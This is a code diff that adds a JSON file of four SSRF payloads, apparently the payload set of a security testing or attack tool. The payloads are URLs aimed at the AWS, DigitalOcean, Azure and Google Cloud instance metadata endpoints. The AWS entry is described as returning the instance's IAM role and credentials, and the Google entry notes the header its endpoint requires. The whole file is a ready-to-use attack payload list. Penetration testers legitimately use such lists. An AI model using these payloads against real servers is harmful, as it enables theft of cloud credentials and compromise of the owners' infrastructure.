@@ -1,1 +1,39 @@
-// TODO: ADD basic SSRF payloads
+[
+    {
+        "id": 1,
+        "name": "AWS ec2 metadata",
+        "description": "Return IAM role associated with the ec2 instance and the credentials",
+        "steps" :
+        [
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials",
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>/"
+        ]
+    },
+    {
+        "id": 2,
+        "name": "Digital Ocean metadata",
+        "description": "Digital Ocean metadata",
+        "steps" :
+        [
+            "http://169.254.169.254/metadata/v1.json"
+        ]
+    },
+    {
+        "id": 3,
+        "name": "Azure metadata",
+        "description": "Microsoft Azure metadata",
+        "steps" :
+        [
+            "http://169.254.169.254/metadata/v1/maintenance"
+        ]
+    },
+    {
+        "id": 4,
+        "name": "Google Cloud metadata",
+        "description": "Google Cloud metadata | require ('X-Google-Metadata-Request: True' or 'Metadata-Flavor: Google')",
+        "steps" :
+        [
+            "http://169.254.169.254/computeMetadata/v1/"
+        ]
+    }
+]
